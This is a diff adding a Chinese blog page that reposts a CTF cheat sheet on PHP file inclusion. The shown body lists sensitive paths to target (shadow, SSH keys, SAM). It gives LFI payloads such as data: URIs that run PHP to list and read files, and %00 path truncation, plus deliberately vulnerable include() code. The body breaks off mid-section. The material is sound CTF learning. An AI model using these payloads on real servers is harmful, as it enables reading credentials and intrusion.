@@ -1,0 +1,1008 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    文件包含小tip |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="转载自ctf文件包含总结 - 杂谈小记 | Clear Mind &#x3D; P1kap1 &#x3D; 东隅已逝，桑榆非晚  Data伪协议 123456789101112data:,&lt;文本数据&gt;  data:text&#x2F;plain,&lt;文本数据&gt;  data:text&#x2F;html,&lt;HTML代码&gt;  data:text&#x2F;html;base64,&lt;base64编码的HTML代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含小tip">
+<meta property="og:url" content="http://example.com/2025/05/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8Ftip/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="转载自ctf文件包含总结 - 杂谈小记 | Clear Mind &#x3D; P1kap1 &#x3D; 东隅已逝，桑榆非晚  Data伪协议 123456789101112data:,&lt;文本数据&gt;  data:text&#x2F;plain,&lt;文本数据&gt;  data:text&#x2F;html,&lt;HTML代码&gt;  data:text&#x2F;html;base64,&lt;base64编码的HTML代码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t017a698e2084ab0011.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t018d1d61d49d5af756.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t01b4d0f072cf1b60e9.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t018d1d61d49d5af756-17666679298537.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t01b4d0f072cf1b60e9-176666796152310.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t0189c0caa43809494a.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t0158deff2e174028b8.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t01a330620896b3cd5c.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t013523944235c9f89d.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t013499c43603f5729c.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/t012912d8076af5977e.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/EnhdZ4.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201010194658099-100509760.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201010195459494-303350987.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201010195935484-1603129676.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201010203352916-1787825804.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201011101000761-1649541695.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201010204012871-1202434485.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201011101006139-1700977622.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201010203400391-335990203.png">
+<meta property="og:image" content="http://example.com/2025/05/08/images/1999159-20201010203406645-571446662.png">
+<meta property="article:published_time" content="2025-05-08T07:26:17.000Z">
+<meta property="article:modified_time" content="2026-03-22T06:25:27.227Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/05/08/images/t017a698e2084ab0011.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/1737907114de8a.jpg" alt="文件包含小tip">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">文件包含小tip</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text"> Data伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.</span> <span class="toc-text"> 本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">2.1.</span> <span class="toc-text"> 敏感文件路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text"> 伪协议读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#00-%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.1.</span> <span class="toc-text"> %00 截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 路径长度截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 点号截断文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABpearcmdphp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99%E5%85%A5shell"><span class="toc-number">2.3.</span> <span class="toc-text"> 裸文件包含(pearcmd.php文件包含写入shell)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 例题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.</span> <span class="toc-text"> 日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 中间件日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">2.4.1.1.</span> <span class="toc-text"> 例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.2.</span> <span class="toc-text"> ssh 日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.5.</span> <span class="toc-text"> session 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.6.</span> <span class="toc-text"> 临时文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABshell"><span class="toc-number">3.</span> <span class="toc-text"> nginx缓存文件包含shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text"> Nginx缓存机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%97%B6%E9%97%B4%E7%AA%97%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text"> 关键时间窗口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.3.</span> <span class="toc-text"> EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-lfi%E5%88%A9%E7%94%A8%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6getshell-%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.</span> <span class="toc-text"> PHP LFI利用临时文件Getshell 姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6"><span class="toc-number">4.1.</span> <span class="toc-text"> 临时文件机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">4.1.1.</span> <span class="toc-text"> 全局变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">4.1.2.</span> <span class="toc-text"> 存储目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="toc-number">4.1.3.</span> <span class="toc-text"> 命名规则</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo%E7%89%B9%E6%80%A7"><span class="toc-number">4.2.</span> <span class="toc-text"> PHPINFO特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 测试代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text"> 漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.3.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php7-segment-fault"><span class="toc-number">4.3.</span> <span class="toc-text"> php7 Segment Fault</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">4.3.1.</span> <span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">4.3.2.</span> <span class="toc-text"> 漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">4.3.3.</span> <span class="toc-text"> Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83"><span class="toc-number">4.3.4.</span> <span class="toc-text"> 代码环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-number">4.3.5.</span> <span class="toc-text"> 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%90%8Dexp"><span class="toc-number">4.3.6.</span> <span class="toc-text"> 爆破临时文件名exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php7-%E8%80%81%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80"><span class="toc-number">4.3.7.</span> <span class="toc-text"> php7 老版本通杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-session-%E4%B8%8A%E4%BC%A0%E8%BF%9B%E5%BA%A6"><span class="toc-number">5.</span> <span class="toc-text"> 利用 Session 上传进度</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-文件包含小tip" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8Ftip/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-08T07:26:17.000Z" itemprop="datePublished">2025-05-08</time>
+    <time style="display: none;" id="post-update-time">2026-03-22</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>转载自<a target="_blank" rel="noopener" href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</a></p>
+<h2 id="data伪协议"><a class="markdownIt-Anchor" href="#data伪协议"></a> Data伪协议</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:,&lt;文本数据&gt;  </span><br><span class="line">data:text/plain,&lt;文本数据&gt;  </span><br><span class="line">data:text/html,&lt;HTML代码&gt;  </span><br><span class="line">data:text/html;base64,&lt;base64编码的HTML代码&gt;  </span><br><span class="line">data:text/css,&lt;CSS代码&gt;  </span><br><span class="line">data:text/css;base64,&lt;base64编码的CSS代码&gt;  </span><br><span class="line">data:text/javascript,&lt;Javascript代码&gt;  </span><br><span class="line">data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;  </span><br><span class="line">data:image/gif;base64,base64编码的gif图片数据  </span><br><span class="line">data:image/png;base64,base64编码的png图片数据  </span><br><span class="line">data:image/jpeg;base64,base64编码的jpeg图片数据  </span><br><span class="line">data:image/x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure>
+<h2 id="本地文件包含"><a class="markdownIt-Anchor" href="#本地文件包含"></a> 本地文件包含</h2>
+<p>本地文件包含就是通过浏览器包含 web 服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。</p>
+<h3 id="敏感文件路径"><a class="markdownIt-Anchor" href="#敏感文件路径"></a> 敏感文件路径</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">日志路径</span><br><span class="line">/logs/access.log     #windows apache</span><br><span class="line">/logs/error.log      #windows apache</span><br><span class="line">/var/log/apache/error.log     #Apache</span><br><span class="line">/var/log/apache/access_log   #Apache</span><br><span class="line">/var/www/logs/access_log    #Apache</span><br><span class="line">/var/log/asscess_log       #Apache</span><br><span class="line">/var/log/access.log       #Apache</span><br><span class="line">/usr/local/apache/logs/error_log</span><br><span class="line">/usr/local/apache/logs/access_log</span><br><span class="line">/etc/httpd/logs/access_log    #Apache</span><br><span class="line">/var/log/nginx/access.log或者error.log   #Nginx</span><br><span class="line">/logs/access.log或者error.log     #windows Nginx</span><br><span class="line">C:\windows\system32\LogFiles   #iis6.0版本</span><br><span class="line">%SystemDrive%\inetpub\logs\LogFiles #iis7.5版本</span><br><span class="line"></span><br><span class="line">session 路径</span><br><span class="line">/tmp/sess_phpsession_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">敏感信息路径</span><br><span class="line">windows</span><br><span class="line">c:\boot.ini  #查看系统版本</span><br><span class="line">c:\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件</span><br><span class="line">c:\Windows\repair\sam  #存储系统初次安装密码</span><br><span class="line">c:\Windows\php.ini  #php配置信息</span><br><span class="line">c:\Windows\my.ini  #mysql配置信息</span><br><span class="line">c:\Program Files\mysql\my.ini</span><br><span class="line">c:\Program Files\mysql\data\mysql\user.MYD #mysql root</span><br><span class="line">phpstudy的各种路径具体分析</span><br><span class="line"></span><br><span class="line">linux</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.keystore</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/passwd                #账户信息</span><br><span class="line">/etc/shadow                #账户密码信息</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/root/httpd/conf/httpd.conf</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]*</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/config.gz</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf #Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf #虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini     #PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf          #Apache配置文件</span><br><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/environ</span><br><span class="line">/etc/apache2/apache2.conf        #ubuntu 下配置文件</span><br><span class="line">/etc/my.conf                     # MySQL 配置文件</span><br><span class="line">/etc/nginx/nginx.conf            #Nginx配置文件</span><br></pre></td></tr></table></figure>
+<h3 id="伪协议读文件"><a class="markdownIt-Anchor" href="#伪协议读文件"></a> 伪协议读文件</h3>
+<p><strong>data伪协议：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $_GET[&#x27;file&#x27;];</span><br></pre></td></tr></table></figure>
+<p>读目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:text/plain,&lt;?php print_r(glob(&#x27;/*&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
+<p>读文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:text/plain,&lt;?php print_r(file(&#x27;/etc/pas&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
+<p>php://filter，直接看php:filter那篇</p>
+<p>常见的过滤绕过方式有三种：</p>
+<p>%00 截断文件包含 路径长度截断包含 点好截断文件包含</p>
+<h4 id="00-截断文件包含"><a class="markdownIt-Anchor" href="#00-截断文件包含"></a> %00 截断文件包含</h4>
+<p>利用条件 :</p>
+<p>这个漏洞的使用必须满足如下条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc=off </span><br><span class="line"></span><br><span class="line">PHP 版本低于 5.3.4 </span><br></pre></td></tr></table></figure>
+<p>输入以下测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.abc.com/xxx/file.php?file=../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure>
+<p>通过 %00 截断了后面的 html 拓展名过滤，成功读取了 boot.ini 的内容</p>
+<h4 id="路径长度截断文件包含"><a class="markdownIt-Anchor" href="#路径长度截断文件包含"></a> 路径长度截断文件包含</h4>
+<p>操作系统存在着最大路径长度的限制。可以输入超过最大路劲长度的目录，这样系统就会将后面的路劲丢弃，导致拓展名截断。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用条件</span><br><span class="line"></span><br><span class="line">Windows 下最大路径长度为 256B</span><br><span class="line">Linux 下最大路径长度为 4096B</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">	include ($file.&quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输入测试以下代码：</p>
